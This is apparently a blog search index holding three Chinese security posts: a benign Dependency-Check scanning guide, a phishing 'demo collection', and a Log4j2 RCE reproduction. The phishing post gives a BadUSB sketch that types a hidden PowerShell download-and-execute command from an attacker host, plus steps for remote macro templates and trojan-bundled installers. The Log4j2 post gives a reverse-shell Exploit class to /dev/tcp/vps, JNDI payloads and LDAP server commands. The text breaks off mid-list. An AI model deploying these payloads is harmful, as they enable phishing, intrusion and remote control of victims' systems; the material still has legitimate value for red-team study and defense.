<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Dependency-Check SCA工具使用指南</title>
    <link href="/2022/08/03/Dependency-Check-SCA%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/"/>
    <url>/2022/08/03/Dependency-Check-SCA%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/</url>
    
    <content type="html"><![CDATA[<h1 id="Dependency-Check-SCA工具使用指南"><a href="#Dependency-Check-SCA工具使用指南" class="headerlink" title="Dependency-Check SCA工具使用指南"></a>Dependency-Check SCA工具使用指南</h1><h2 id="1-工具介绍"><a href="#1-工具介绍" class="headerlink" title="1.工具介绍"></a>1.工具介绍</h2><blockquote><p>官方翻译：Dependency-Check是一种软件组成分析（SCA）工具，它试图检测项目依赖项中包含的公开披露的漏洞。它通过确定给定依赖项是否存在通用平台枚举（CPE）标识符来完成此操作。如果找到，它将生成一个报告，链接到相关的CVE条目。</p></blockquote><hr><ul><li>扫描原理：分析当前项目中的组件依赖包版本与公开漏洞库中的对应版本漏洞进行对比，比如你项目中依赖了Struts 2.0.0，那这个工具会告诉你Struts2.0.0相关的jar包存在风险</li></ul><h2 id="2-工具使用"><a href="#2-工具使用" class="headerlink" title="2.工具使用"></a>2.工具使用</h2><h3 id="2-1-工具下载安装"><a href="#2-1-工具下载安装" class="headerlink" title="2.1 工具下载安装"></a>2.1 工具下载安装</h3><ul><li><p>Github开源项目<a href="https://github.com/jeremylong/DependencyCheck">Dependency-Check地址</a></p></li><li><p>下载安装最新的<a href="https://github.com/jeremylong/DependencyCheck/releases/">release版本</a>,解压并安装</p><p><img src="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/img202208031632887.png" alt="image-20220803163230835"></p><p><img src="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/img%E6%96%87%E4%BB%B6%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%84.png" alt="image-20220803163336650"></p></li></ul><h3 id="2-2-扫描"><a href="#2-2-扫描" class="headerlink" title="2.2 扫描"></a>2.2 扫描</h3><h4 id="2-2-1在线对比公开漏洞库（CVE、CWE、CPE）"><a href="#2-2-1在线对比公开漏洞库（CVE、CWE、CPE）" class="headerlink" title="2.2.1在线对比公开漏洞库（CVE、CWE、CPE）"></a>2.2.1在线对比公开漏洞库（CVE、CWE、CPE）</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">./bin/dependency-check.sh --project &quot;my_app&quot; --scan &quot;/tmp/mnt/spring-cloud-gateway-0.0.1-SNAPSHOT.jar&quot; -f CSV -o vuln.csv<br></code></pre></td></tr></table></figure><blockquote><p>–project “my_app” 指定扫描项目名</p><p>–scan “&#x2F;tmp&#x2F;mnt&#x2F;spring-cloud-gateway-0.0.1-SNAPSHOT.jar” 指定扫描系统，此处扫描使用了spring-cloud-gateway rce的靶场地址</p><p>-f CSV 指定扫描报告格式（默认HTML,必须大写）</p><p>-o vuln.csv 指定扫描报告导出地址和文件名</p></blockquote><p><img src="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/img202208031642378%E6%89%AB%E6%8F%8F%E5%AE%8C%E6%88%90.png" alt="image-20220803164206353"></p><h4 id="2-2-2-使用本地漏洞库进行扫描"><a href="#2-2-2-使用本地漏洞库进行扫描" class="headerlink" title="2.2.2 使用本地漏洞库进行扫描"></a>2.2.2 使用本地漏洞库进行扫描</h4><ol><li>将漏洞库下载到本地</li></ol><p>​<a href="https://github.com/stevespringett/nist-data-mirror/releases/">nist-data-mirror漏洞镜像项目地址</a> ，第一次下载耗时较久</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">java -jar nist-data-mirror.jar /usr/share/nginx/html/nist-data<br></code></pre></td></tr></table></figure><blockquote><p>&#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html&#x2F;nist-data 是nginx的目录,存放漏洞库文件</p></blockquote><ol start="2"><li>从本地加载漏洞库</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">./bin/dependency-check.sh --project test -s ../spring-cloud-gateway-0.0.1-SNAPSHOT.jar -f CSV -o vuln.csv --cveUrlModified https://127.0.0.1/nist-data/nvdcve-1.1-modified.json.gz --cveUrlBase https://127.0.0.1/nist-data/nvdcve-1.1-2022.json.gz<br></code></pre></td></tr></table></figure><blockquote><p>–project “my_app” 指定扫描项目名</p><p>–scan “&#x2F;tmp&#x2F;mnt&#x2F;spring-cloud-gateway-0.0.1-SNAPSHOT.jar” 指定扫描系统，此处扫描使用了spring-cloud-gateway rce的靶场地址</p><p>-f CSV 指定扫描报告格式（默认HTML,必须大写）</p><p>-o vuln.csv 指定扫描报告导出地址和文件名</p><p>–cveUrlModified 指定cve-modified文件，选择 nvdcve-1.1-modified.json.gz</p><p>–cveUrlBase 指定当年的cve文件，选择nvdcve-1.1-2022.json.gz</p><p>至于cveUrlModified和cveUrlBase为什么选这两个，我也不懂，看官网参数的默认值就是这两个，毕竟没有中文文档，<a href="https://jeremylong.github.io/DependencyCheck/dependency-check-maven/configuration.html?spm=a2c6h.12873639.article-detail.6.32f42378QRDyy2">文档地址</a>。尝试换cveUrlBase参数为2005年漏洞库：.&#x2F;bin&#x2F;dependency-check.sh –project test -s ..&#x2F;spring-cloud-gateway-0.0.1-SNAPSHOT.jar -f CSV -o vuln2005.csv –cveUrlModified &#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html&#x2F;nist-data&#x2F;nvdcve-1.1-modified.json.gz –cveUrlBase &#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html&#x2F;nist-data&#x2F;nvdcve-1.1-2005.json.gz&#96;，发现得到的报告完全一致。</p><p><img src="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/img202208042302372.png" alt="参数详情"></p></blockquote><p>尝试换参数</p><h3 id="2-3查看扫描报告"><a href="#2-3查看扫描报告" class="headerlink" title="2.3查看扫描报告"></a>2.3查看扫描报告</h3><ul><li>主要内容就4列，扫描依赖名称、对应物理路径、描述、漏洞编号</li></ul><p><img src="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/img202208031646698%E6%89%AB%E6%8F%8F%E6%8A%A5%E5%91%8A.png" alt="image-20220803164534892"></p>]]></content>
    
    
    <categories>
      
      <category>note</category>
      
    </categories>
    
    
    <tags>
      
      <tag>tools</tag>
      
      <tag>漏扫</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>钓鱼演示合集</title>
    <link href="/2022/07/01/%E9%92%93%E9%B1%BC%E6%BC%94%E7%A4%BA%E5%90%88%E9%9B%86/"/>
    <url>/2022/07/01/%E9%92%93%E9%B1%BC%E6%BC%94%E7%A4%BA%E5%90%88%E9%9B%86/</url>
    
    <content type="html"><![CDATA[<h1 id="钓鱼演示合集"><a href="#钓鱼演示合集" class="headerlink" title="钓鱼演示合集"></a>钓鱼演示合集</h1><h1 id="一-宏文档"><a href="#一-宏文档" class="headerlink" title="一.宏文档"></a>一.宏文档</h1><h2 id="1-new-listener"><a href="#1-new-listener" class="headerlink" title="1.new listener"></a>1.new listener</h2><p><img src="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/img202208011704010.png" alt="image-20210528104056006"></p><h2 id="2-生成ms宏文档模板"><a href="#2-生成ms宏文档模板" class="headerlink" title="2.生成ms宏文档模板"></a>2.生成ms宏文档模板</h2><ul><li>cs生成payload</li></ul><p><img src="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/img202208011704286.png" alt="image-20210528122719811"></p><p><img src="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/img202208011704513.png" alt="image-20210528122744074"></p><ul><li>新建空白文档，创建宏代码</li></ul><p><img src="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/img202208011704173.png" alt="image-20220718074759409"></p><p><img src="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/img202208011704598.png" alt="image-20220718074824071"></p><ul><li>将生成的payload代码放到新建文档的对象里</li></ul><p><img src="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/img202208011704075.png" alt="image-20220718075023914"></p><ul><li>另存为.dotm后缀</li></ul><p><img src="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/img202208011704549.png" alt="image-20220718075143963"></p><h2 id="3-远程加载宏文档"><a href="#3-远程加载宏文档" class="headerlink" title="3.远程加载宏文档"></a>3.远程加载宏文档</h2><p><img src="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/img202208011704752.png" alt="image-20210528161619818"></p><ol><li><p>随意选择一个模板，保存在本地 （my.docx)</p></li><li><p>修改文件后缀为.zip（my.zip）并解压为文件夹</p></li><li><p>找到.&#x2F;word&#x2F;_rels&#x2F;settings.xml.rels文件，修改target为dotm宏木马模板地址</p></li></ol><p><img src="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/img202208011704968.png" alt="image-20220718080132174"></p><ol start="4"><li>保存文件，将所有解压文件重新压缩成zip，并修改后缀名为docx</li></ol><p><img src="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/img202208011704986.png" alt="image-20220718080234121"></p><ol start="5"><li>打开docx文件，启用了宏功能会自动加载远程含有宏木马的模板，主机上线</li></ol><p><img src="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/img202208011704388.png" alt="image-20220718080417628"></p><h1 id="二-BadUSB"><a href="#二-BadUSB" class="headerlink" title="二.BadUSB"></a>二.BadUSB</h1><h2 id="1-简介"><a href="#1-简介" class="headerlink" title="1.简介"></a>1.简介</h2><p>通过模拟移动U盘直接插入对方电脑，让对方电脑执行代码，达到干扰、控制主机或者窃取信息等目的。</p><h2 id="2-硬件材料"><a href="#2-硬件材料" class="headerlink" title="2.硬件材料"></a>2.硬件材料</h2><p>Digispark （Attiny85）开发板，淘宝上10元左右</p><p><img src="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/img202208011704914.png" alt="image-20210922154341721"></p><h2 id="3-生成powershell远程加载payload"><a href="#3-生成powershell远程加载payload" class="headerlink" title="3.生成powershell远程加载payload"></a>3.生成powershell远程加载payload</h2><p><img src="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/img202208011704239.png" alt="image-20210922155149125"></p><h2 id="4-安装Digispark-（Attiny85）开发板驱动"><a href="#4-安装Digispark-（Attiny85）开发板驱动" class="headerlink" title="4.安装Digispark （Attiny85）开发板驱动"></a>4.安装Digispark （Attiny85）开发板驱动</h2><p> <img src="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/img202208011704674.png" alt="image-20210922155450915"></p><h2 id="5-安装配置Arduino软件"><a href="#5-安装配置Arduino软件" class="headerlink" title="5.安装配置Arduino软件"></a>5.安装配置Arduino软件</h2><ul><li><p>点击文件-&gt;首选项-&gt;附加开发版管理网址</p><p>加入digistumpArduino的开发环境：</p><p><a href="https://raw.githubusercontent.com/ArminJo/DigistumpArduino/master/package_digistump_index.json">https://raw.githubusercontent.com/ArminJo/DigistumpArduino/master/package_digistump_index.json</a></p></li></ul><p><img src="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/img202208011704952.png" alt="image-20210922155851260"></p><ul><li>点击工具中的开发板中的开发板管理器，等待下载索引完成（可能需要使用代理），搜索并安装“Digistump AVR Boards by Digistump”</li></ul><p><img src="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/img202208011704087.png" alt="image-20210922160120187"></p><ul><li>安装完成后在开发板中选择Digispark</li></ul><p><img src="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/img202208011704415.png" alt="image-20210922160301624"></p><h2 id="6-代码编译上传到开发板上"><a href="#6-代码编译上传到开发板上" class="headerlink" title="6.代码编译上传到开发板上"></a>6.代码编译上传到开发板上</h2><ul><li>代码如下</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;DigiKeyboard.h&quot;</span></span><br><span class="hljs-type">void</span> <span class="hljs-title function_">setup</span><span class="hljs-params">()</span> &#123;<br>DigiKeyboard.delay(<span class="hljs-number">1000</span>);<br>DigiKeyboard.sendKeyStroke(<span class="hljs-number">0</span>);<br>DigiKeyboard.delay(<span class="hljs-number">500</span>);<br>DigiKeyboard.sendKeyStroke(KEY_CAPS_LOCK);<br>DigiKeyboard.delay(<span class="hljs-number">500</span>);<br>DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT);<br>DigiKeyboard.delay(<span class="hljs-number">500</span>);<br>DigiKeyboard.println(<span class="hljs-string">&quot;powershell -windowstyle hidden IEX (New-Object Net.WebClient).DownloadString(&#x27;http://vps/file&#x27;)&quot;</span>);<br>DigiKeyboard.delay(<span class="hljs-number">500</span>);<br>DigiKeyboard.sendKeyStroke(KEY_CAPS_LOCK);<br>DigiKeyboard.delay(<span class="hljs-number">100</span>);<br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">loop</span><span class="hljs-params">()</span> &#123;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>编译上传</li></ul><p><img src="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/img202208011704926.png" alt="image-20210922160627909"></p><ul><li>插入开发板，成功写入代码</li></ul><p><img src="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/img202208011704327.png" alt="image-20210922163924630"></p><h2 id="7-效果演示"><a href="#7-效果演示" class="headerlink" title="7.效果演示"></a>7.效果演示</h2><ul><li>插入badusb进行测试，需要等待电脑识别驱动后才会进行操作（1-3s左右）</li></ul><p><img src="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/img202208011704642.gif" alt="badusb演示"></p><h1 id="三-自解压安装文件捆绑"><a href="#三-自解压安装文件捆绑" class="headerlink" title="三.自解压安装文件捆绑"></a>三.自解压安装文件捆绑</h1><h2 id="1-准备安装文件-木马"><a href="#1-准备安装文件-木马" class="headerlink" title="1.准备安装文件+木马"></a>1.准备安装文件+木马</h2><p>左边为flash安装包，右边为cs木马，python简单免杀以及修改图标</p><p><img src="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/img202208011704817.png" alt="image-20220721224723567"></p><h2 id="2-WinRAR压缩"><a href="#2-WinRAR压缩" class="headerlink" title="2.WinRAR压缩"></a>2.WinRAR压缩</h2><ul><li>选中两个文件，右键winrar压缩，勾选自解压</li></ul><p><img src="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/img202208011704787.png" alt="image-20220721225108121"></p><ul><li>高级-&gt;自解压选项-&gt;设置,把解压后运行的地方加上安装包和木马文件名</li></ul><p><img src="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/img202208011704013.png" alt="image-20220721225240455"></p><ul><li>模式选择全部隐藏</li></ul><p><img src="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/img202208011704395.png" alt="image-20220721225436805"></p><ul><li>更新选择”解压并更新文件” 和 “覆盖所有文件”，图标可自行替换，一般用被捆绑的文件图标</li></ul><p><img src="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/img202208011704919.png" alt="image-20220721225548122"></p><h2 id="3-效果演示"><a href="#3-效果演示" class="headerlink" title="3.效果演示"></a>3.效果演示</h2><p>直接双击做好的自解压安装包，即会运行指定木马程序</p><p><img src="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/img202208011704109.gif" alt="自解压演示"></p>]]></content>
    
    
    <categories>
      
      <category>note</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Cobalt Strike</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Log4j2 RCE漏洞复现</title>
    <link href="/2021/12/24/Log4j2-RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <url>/2021/12/24/Log4j2-RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="Log4j2-RCE漏洞复现"><a href="#Log4j2-RCE漏洞复现" class="headerlink" title="Log4j2 RCE漏洞复现"></a>Log4j2 RCE漏洞复现</h1><h2 id="1-漏洞原理"><a href="#1-漏洞原理" class="headerlink" title="1.漏洞原理"></a>1.漏洞原理</h2><p>Apache Log4j2是一个开源的日志记录组件，使用非常的广泛。</p><p>日志在打印时当遇到 <code>$&#123;</code> 后，Interpolator 类以 <code>:</code> 号作为分割，将表达式内容分割成两部分，前面部分作为 prefix，后面部分作为 key。然后通过 prefix 去找对应的 lookup，通过对应的 lookup 实例调用 lookup 方法，最后将 key 作为参数带入执行。</p><h2 id="2-影响程序、组件及版本"><a href="#2-影响程序、组件及版本" class="headerlink" title="2.影响程序、组件及版本"></a>2.影响程序、组件及版本</h2><p>影响程序有：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java">Spring-Boot-strater-log4j2<br>Apache Struts2<br>Apache Solr<br>Apache Flink<br>Apache Druid<br>ElasticSearch<br>Flume<br>Dubbo<br>Redis<br>Logstash<br>Kafka<br>vmvare<br></code></pre></td></tr></table></figure><table><thead><tr><th>组件</th><th>影响版本</th><th>安全版本</th></tr></thead><tbody><tr><td>apache:log4j</td><td>2.0 - 2.15.0-rc1</td><td>2.15.0-rc2</td></tr></tbody></table><h2 id="3-漏洞复现"><a href="#3-漏洞复现" class="headerlink" title="3.漏洞复现"></a>3.漏洞复现</h2><ul><li><h3 id="靶场源码如下："><a href="#靶场源码如下：" class="headerlink" title="靶场源码如下："></a>靶场源码如下：</h3></li></ul><p>靶场下载：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker pull registry.cn-hangzhou.aliyuncs.com/fengxuan/log4j_vuln<br><br>docker run -it -d -p 8080:8080 --name log4j_vuln_container registry.cn-hangzhou.aliyuncs.com/fengxuan/log4j_vuln<br><br>docker exec -it log4j_vuln_container /bin/bash<br><br>/bin/bash /home/apache-tomcat-8.5.45/bin/startup.sh<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.evalshell.webstudy;<br><br><span class="hljs-keyword">import</span> org.apache.logging.log4j.LogManager;<br><span class="hljs-keyword">import</span> org.apache.logging.log4j.Logger;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> javax.servlet.ServletException;<br><span class="hljs-keyword">import</span> javax.servlet.http.*;<br><span class="hljs-keyword">import</span> javax.servlet.annotation.*;<br><br><br><span class="hljs-meta">@WebServlet(name = &quot;helloServlet&quot;, value = &quot;/hello-fengxuan&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HelloServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;<br>   <span class="hljs-keyword">private</span> String message;<br>   <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Logger</span> <span class="hljs-variable">logger</span> <span class="hljs-operator">=</span> LogManager.getLogger(HelloServlet.class);<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">()</span> &#123;<br>       message = <span class="hljs-string">&quot;Hello World!&quot;</span>;<br>  &#125;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>       response.setContentType(<span class="hljs-string">&quot;text/html&quot;</span>);<br>       response.setHeader(<span class="hljs-string">&quot;Content-Type&quot;</span>, <span class="hljs-string">&quot;text/html; charset=utf-8&quot;</span>);<br>       System.out.println(request.getQueryString());<br><br><br>       <span class="hljs-comment">// Hello</span><br>       <span class="hljs-type">PrintWriter</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> response.getWriter();<br>       out.println(<span class="hljs-string">&quot;&lt;html&gt;&lt;body&gt;&quot;</span>);<br>       out.println(<span class="hljs-string">&quot;&lt;span&gt;你好，兄弟，请用post请求来搞我！&lt;/span&gt;&quot;</span>);<br>       out.println(<span class="hljs-string">&quot;&lt;/body&gt;&lt;/html&gt;&quot;</span>);<br>  &#125;<br><br><br>   <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doPost</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>       <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> req.getParameter(<span class="hljs-string">&quot;c&quot;</span>);<br>       System.out.println(name);<br>       logger.error(name);<br>       resp.setContentType(<span class="hljs-string">&quot;text/html&quot;</span>);<br>       resp.setHeader(<span class="hljs-string">&quot;Content-Type&quot;</span>, <span class="hljs-string">&quot;text/html; charset=utf-8&quot;</span>);<br>       <span class="hljs-type">PrintWriter</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> resp.getWriter();<br>       out.println(<span class="hljs-string">&quot;&lt;html&gt;&lt;body&gt;&quot;</span>);<br>       out.println(<span class="hljs-string">&quot;&lt;h1&gt;可恶！又被你装到了！&lt;/h1&gt;&quot;</span>);<br>       out.println(<span class="hljs-string">&quot;&lt;/body&gt;&lt;/html&gt;&quot;</span>);<br>  &#125;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span> &#123;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><p>源码会调用log4j2组件记录post传入的参数c，可以恶意构造c参数<code>c=$&#123;jndi:ldap://dnslog&#125;</code>验证漏洞</p><p><img src="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/img202208011714083.png" alt="image-20211213155052319"></p><p><img src="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/img202208011714556.png" alt="image-20211213155153476"></p><p>可以在dnslog平台看到记录，说明漏洞存在。</p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><blockquote><p>注意：编译exp的java版本最好是低版本，防止目标主机上的jdk版本过低无法执行恶意类</p><p>此处用的是jdk8，靶机也是jdk8</p></blockquote><h4 id="原理：架设ldap服务器并生成恶意类，远程加载恶意类"><a href="#原理：架设ldap服务器并生成恶意类，远程加载恶意类" class="headerlink" title="原理：架设ldap服务器并生成恶意类，远程加载恶意类"></a>原理：架设ldap服务器并生成恶意类，远程加载恶意类</h4><p>1.编写恶意Exploit.java</p><p>反弹shell的ip和端口替换即可</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Exploit</span> &#123;<br>   <span class="hljs-keyword">public</span> <span class="hljs-title function_">Exploit</span><span class="hljs-params">()</span>&#123;<br>       <span class="hljs-keyword">try</span>&#123;<br>           <span class="hljs-comment">// 要执行的命令</span><br>           <span class="hljs-type">Process</span> <span class="hljs-variable">pc</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;/bin/bash&quot;</span>,<span class="hljs-string">&quot;-c&quot;</span>,<span class="hljs-string">&quot;bash -i &gt;&amp; /dev/tcp/vps/5656 0&gt;&amp;1&quot;</span>&#125;);<br>           pc.waitFor();<br>      &#125; <span class="hljs-keyword">catch</span>(Exception e)&#123;<br>           e.printStackTrace();<br>      &#125;<br>  &#125;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] argv)</span> &#123;<br>       <span class="hljs-type">Exploit</span> <span class="hljs-variable">e</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Exploit</span>();<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>​2.javac编译java代码-&gt;Exploit.class</p><p>​<img src="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/img202208011714799.png" alt="image-20211213155517118"></p><p>3.将编写的exp放到http服务下，并在vps上搭建ldap服务</p><p><code>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer &quot;http://exploit.class地址/#Exploit&quot; 9999</code></p><p>此时vps的ldap地址为：<code>vps:9999/Exploit</code></p><p>RCE的payload：<code>c=$&#123;jndi:ldap://vps:9999/#Exploit&#125;</code></p><p>4.vps监听shell</p><p><code>nc -nlvvp 5656</code></p><p>5.提交payload，shell反弹</p><p><img src="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/img202208011714306.png" alt="image-20211213160639205"></p><h4 id="通过ldap集成化工具利用"><a href="#通过ldap集成化工具利用" class="headerlink" title="通过ldap集成化工具利用"></a>通过ldap集成化工具利用</h4><p><a href="https://github.com/Jeromeyoung/JNDIExploit-1">JNDIExploit-1</a></p><p>下载安装使用</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">git clone https://github.com/Jeromeyoung/JNDIExploit-1.git<br>cd JNDIExploit-1<br>mvn clean package -DskipTests<br>java -jar JNDIExploit-1.3-SNAPSHOT.jar -i vps -l 1389 -p 8888<br><br></code></pre></td></tr></table></figure><blockquote><p>-i:指定服务器地址</p><p>-l:指定ldap服务地址，默认1389</p><p>-p:指定http服务地址，默认3456</p></blockquote><p>发送payload:<code>c=$&#123;jndi:ldap://vps:1389/Basic/TomcatEcho&#125;</code></p><p>header加入cmd参数和执行的命令:<code>cmd: whoami</code></p><p><img src="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/img202208011714645.png" alt="image-20220416120224659"></p><p>其他payload：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs shell">java -jar JNDIExploit-1.3-SNAPSHOT.jar  -u<br>Supported LADP 